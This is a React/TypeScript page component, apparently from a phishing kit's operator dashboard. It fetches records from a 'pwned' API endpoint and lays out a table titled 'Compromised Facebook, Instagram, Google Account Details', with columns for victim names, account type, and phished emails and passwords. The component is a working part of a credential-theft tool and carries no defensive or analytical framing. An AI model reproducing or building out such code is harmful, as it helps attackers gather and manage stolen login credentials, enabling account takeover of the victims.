import { useEffect, useState } from "react";
import NavBar from "../components/NavBar";
import VerifyUser from "../utils/VerifyUser";
import custom_axios from "../axios/custom_axios";
import { ApiConstants } from "../api/api_constants";
import "../assets/Pwn.css";

const Pwned = () => {
    VerifyUser();
    const [pwns, setPwns] = useState([]);
    const [sort, setSort] = useState({
        name: "all",
        date: "ascending",
    });
    async function getPwns() {
        try {
            const response = await custom_axios.get(ApiConstants.SOCIAL.PWNED);
            setPwns(response.data.pwns);
        } catch (error: any) {
            console.log(error);
        }
    }
    useEffect(() => {
        getPwns();
    }, []);
    return (
        <>
            <NavBar></NavBar>
            <div className="main">
                <div className="container">
                    <div className="divTable">
                        <span>
                            <span>
                                Compromised Facebook, Instagram, Google Account
                                Details.
                            </span>
                        </span>
                        <table className="pwnTable">
                            <tbody>
                                <tr>
                                    <th>Name</th>
                                    <th>Type</th>
                                    <th>Email</th>
                                    <th>Password</th>
                                    <th>Created At</th>
                                </tr>
                                {pwns &&
                                    pwns.map((pwn: any) => {
                                        return (
                                            <tr key={pwn._id}>
                                                <td>{pwn.name}</td>
                                                <td>{pwn.type}</td>
                                                <td>{pwn.phis_mail}</td>
                                                <td>{pwn.phis_pass}</td>
                                                <td>{pwn.createdAt}</td>
                                            </tr>
                                        );
                                    })}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </>
    );
};

export default Pwned;
